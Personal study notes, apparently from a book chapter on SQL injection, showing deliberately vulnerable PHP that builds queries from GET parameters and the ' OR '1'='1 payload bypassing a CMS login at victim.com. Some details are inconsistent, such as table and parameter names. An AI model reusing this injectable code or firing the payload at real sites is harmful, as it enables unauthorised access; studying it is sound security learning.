# NOTES FROM THE BOOK BY jclarke

## Ch1
http://www.victim.com/products.php?val=100

```php
$conn = mysql_connect(“localhost”,“username”,“password”);

// dynamically build the sql statement with the input
$query = “SELECT ∗ FROM Products WHERE Price < ‘$_GET[“val”]’ ”.
  “ORDER BY ProductDescription”;

// execute the query against the database
$result = mysql_query($query);

// iterate through the record set
while($row = mysql_fetch_array($result, MYSQL_ASSOC))
{

// display the results to the browser
echo “Description : {$row[‘ProductDescription’]} <br>”.
  “Product ID : {$row[‘ProductID’]} <br>”.
  “Price : {$row[‘Price’]} <br><br>”;

}
```
The same but simplified; in this case, **100.00** would be the value from GET
```sql
SELECT ∗
FROM Products
WHERE Price <‘100.00’
ORDER BY ProductDescription;
```

Injecting the val parameter
```
http://www.victim.com/products.php?val=100' OR '1'='1
```

Built query
```sql
SELECT ∗
FROM ProductsTbl
WHERE Price < ‘100.00’ OR ‘1’ = ‘1’
ORDER BY ProductDescription;
```

Suppose the application has a content manangement system that can be accessed
via the following (unrealistic) url.
```
http://www.victim.com/cms/login.php?username=foo&password=bar
```

The code for login.php would look like this
```php
// connect to the database
$conn = mysql_connect(“localhost”,“username”,“password”);

// dynamically build the sql statement with the input
$query = “SELECT userid FROM CMSUsers WHERE user = ‘$_GET[“user”]’ ”.
  “AND password = ‘$_GET[“password”]’”;

// execute the query against the database
$result = mysql_query($query);

// check to see how many rows were returned from the database
$rowcount = mysql_num_rows($result);

// if a row is returned then the credentials must be valid, so
// forward the user to the admin pages
if ($rowcount ! = 0){header(“Location: admin.php”);}

// if a row is not returned then the credentials must be invalid
else {die(‘Incorrect username or password, please try again.’)}
```

The sql statement built is
```sql
SELECT userid
FROM CMSUsers
WHERE user = 'foo' AND password = 'bar';
```

Problem: dev thinks num of records returned will always be 0 or 1. IF we are
able to inject this and alter the logic, then the statement will select all of the
userids.

Injected password parameter

```http://www.victim.com/cms/login.php?username=foo&password=bar' OR '1'='1```

And the resulting sql statment

```sql
SELECT userid
FROM CMSUsers
WHERE user = ‘foo’ AND password = ‘password’ OR ‘1’ = ‘1’;
```

Logically simplified
```sql
SELECT userid
FROM CMSUsers
WHERE $true
```
